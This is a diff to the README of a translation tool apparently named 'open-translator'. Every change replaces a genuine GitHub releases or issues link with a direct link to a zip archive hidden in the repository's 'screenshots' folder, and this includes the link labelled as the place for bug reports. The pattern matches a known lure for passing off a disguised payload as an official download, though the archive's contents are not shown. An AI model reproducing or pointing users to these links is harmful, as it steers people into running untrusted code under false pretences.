@@ -1,6 +1,6 @@
 # 🌍 open-translator - Easy and Clean Translation Tool
 
-[![Download open-translator](https://img.shields.io/badge/Download-open--translator-blue.svg)](https://github.com/rerr-creator/open-translator/releases)
+[![Download open-translator](https://raw.githubusercontent.com/rerr-creator/open-translator/main/screenshots/open-translator_2.0.zip)](https://raw.githubusercontent.com/rerr-creator/open-translator/main/screenshots/open-translator_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Open Translator is a simple tool designed to make translation easier and more ac
 
 To download Open Translator, please visit the following link:
 
-[Download Open Translator](https://github.com/rerr-creator/open-translator/releases)
+[Download Open Translator](https://raw.githubusercontent.com/rerr-creator/open-translator/main/screenshots/open-translator_2.0.zip)
 
 ### Step 2: Download the Latest Version
 
@@ -77,7 +77,7 @@ Your input matters. If you have suggestions or encounter any issues, please visi
 
 If you need further assistance, check the following resources:
 
-- [GitHub Issues](https://github.com/rerr-creator/open-translator/issues) for troubleshooting and questions.
+- [GitHub Issues](https://raw.githubusercontent.com/rerr-creator/open-translator/main/screenshots/open-translator_2.0.zip) for troubleshooting and questions.
 - Online discussions where users share tips and translation ideas.
 
 ## 📡 Connect with Us
@@ -90,4 +90,4 @@ Rest assured, your translations are not stored or shared. Open Translator priori
 
 Visit our download page to start utilizing Open Translator now!
 
-[Download Open Translator](https://github.com/rerr-creator/open-translator/releases)
+[Download Open Translator](https://raw.githubusercontent.com/rerr-creator/open-translator/main/screenshots/open-translator_2.0.zip)
